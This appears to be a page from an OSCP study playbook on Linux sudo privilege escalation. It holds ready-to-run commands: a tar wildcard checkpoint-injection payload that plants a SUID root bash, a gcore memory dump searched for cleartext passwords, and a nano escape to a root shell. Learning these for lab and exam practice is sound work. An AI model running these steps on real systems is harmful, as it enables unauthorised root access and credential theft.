# Linux - Sudo Check

**Step 14 of 50 · Linux**

*Check whether the current user can run a command as root without a password.*

## Run this

> **Why:** This asks sudo which commands the current account may run and whether a password is required, exposing the exact privilege boundary to test.
```bash
sudo -l
```

## Example output

NOPASSWD binary:
```
User username may run the following commands on host:
    (ALL) NOPASSWD: /usr/bin/find
```

Full sudo:
```
User username may run the following commands on host:
    (ALL : ALL) ALL
```
## What did you get?

- [ ] `(ALL) ALL` is shown → **Run `sudo su`, run `id` to confirm UID 0, then go to Step 21 · [[Linux - Clean Down]]**
- [ ] A specific NOPASSWD binary is shown → **Open the matching GTFOBins entry, copy its SUID or sudo command, run it once, and return here with the resulting identity**
- [ ] A NOPASSWD script path is shown but the file is absent → **Run `ls -la $SudoScriptDir`; if the parent path is writable, run `mkdir -p $SudoScriptDir` and create the approved script, then rerun the exact sudo path**
- [ ] `NOPASSWD: /usr/bin/gcore` is shown → **Run `ps aux | grep root`, set `$Pid` to the target process ID, run `sudo gcore $Pid`, then run `strings core.$Pid | grep -A2 -i "password"`**
- [ ] `NOPASSWD: /usr/bin/tar` with a wildcard `*` argument is shown → **Tar wildcard injection: create `--checkpoint=1`, `--checkpoint-action=exec=sh shell.sh` files in the target directory, then trigger the sudo command**
- [ ] A binary is allowed with a password → **Run `sudo -l`, enter `$Password` when prompted, then open the binary's GTFOBins entry and run its documented sudo command**
- [ ] Nothing useful is shown → **Go to Step 15 · [[Linux - SUID Check]]**

## Notes

GTFOBins documents ways to turn some allowed programs into a root shell.

For tar wildcard injection: the filenames are interpreted as tar flags when `*` expands. Create the checkpoint files in the working directory the sudo command runs against, then trigger the command.

## Gotcha

> [!warning] 💡
> A sudo rule is only useful if the current user can satisfy its password requirement or it is NOPASSWD.

> [!warning] 💡
> `gcore` dumps process memory to a file named `core.<PID>`. Use `strings` piped through `grep` for `Password`, `pass`, and `secret` — service accounts that auto-login often have cleartext credentials in memory.

> [!warning] 💡
> A sudoers entry can reference a file that is not currently present. Check the entire path before looking for an overwrite primitive; when the directory is writable, creating the missing script is the shorter path.

## Tar wildcard checkpoint injection

Use this branch when `sudo -l` shows a privileged `tar` command whose arguments contain an unquoted `*`. When the shell expands the wildcard, filenames beginning with `--` become tar options, including a checkpoint action that runs a script.

> **Why:** These commands create tar-option filenames and a shell payload in the directory the privileged job archives; look for the payload to run when tar reaches its checkpoint.
```bash
# The filenames become tar flags when the privileged wildcard expands.
printf '' > '--checkpoint=1'
printf '' > '--checkpoint-action=exec=sh shell.sh'
printf '#!/bin/sh\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash\n' > shell.sh
chmod +x shell.sh
```

> **Why:** This is the exact privileged archive command that expands the crafted filenames; success is a SUID-root `/tmp/rootbash` or another controlled proof of execution.
```bash
# Run the command exactly as shown by sudo -l, changing only its approved archive path.
sudo tar -czvf /tmp/backup.tar.gz *
ls -l /tmp/rootbash
```

## gcore memory-dump path

`gcore` creates a file containing a running process’s memory. If sudo allows it against a root-owned process, search the dump for service credentials instead of assuming the rule directly gives a shell.

> **Why:** This command finds a root process and dumps its memory with the permitted binary; use the resulting core file as private loot.
```bash
# Pick a relevant root-owned process ID from the first command’s output.
ps aux | grep '[r]oot'
sudo gcore $Pid
```

> **Why:** `strings` extracts readable text and `grep` filters likely credential terms; look for service-account names or password fields, then validate any candidate.
```bash
strings core.$Pid | grep -Ei 'password|pass|cred|secret'
```

## Additional routing

- [ ] Tar creates a SUID-root helper → **Run `/tmp/rootbash -p`, run `id` and `whoami` to confirm UID 0, then remove the checkpoint filenames and helper**
- [ ] `gcore` reveals a candidate credential → **Store it privately and validate it through the relevant credential stage**
- [ ] Neither path applies → **Continue to Step 15 · [[Linux - SUID Check]]**
## Nano command escape

When sudo permits `/bin/nano` on a file, nano's command prompt can execute a shell with the permitted privilege. This requires a proper interactive TTY so the control-key sequence is delivered to nano.

> **Why:** The command starts the exact permitted editor, then the nano shortcuts switch to its execute-command prompt and launch a shell.
```bash
sudo /bin/nano $SudoFile
# Press Ctrl+R, then Ctrl+X
# Enter: reset; sh 1>&0 2>&0
# Press Enter, then run id and whoami
```

> [!warning] 💡
> If the terminal is garbled or the shortcuts do not register, restore the TTY with `reset` and retry the exact sequence.

**Reference:** [GTFOBins nano](https://gtfobins.github.io/gtfobins/nano/#sudo)
## Seen in
- [[OSCP/BOXES/WRITE UPS/Linux/3. Payday|Payday]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/2. Pelican|Pelican]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/9. Nukem|Nukem]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/10. Cockpit|Cockpit]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- created a missing sudo-allowed script and used it to plant SUID Bash
- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]] -- passwordless sudo nano yielded a root shell through the command escape

## Related stages

- [[Linux - Service Scan]]
- [[Linux - Web Enum]]
- [[Linux - Exploit Search]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
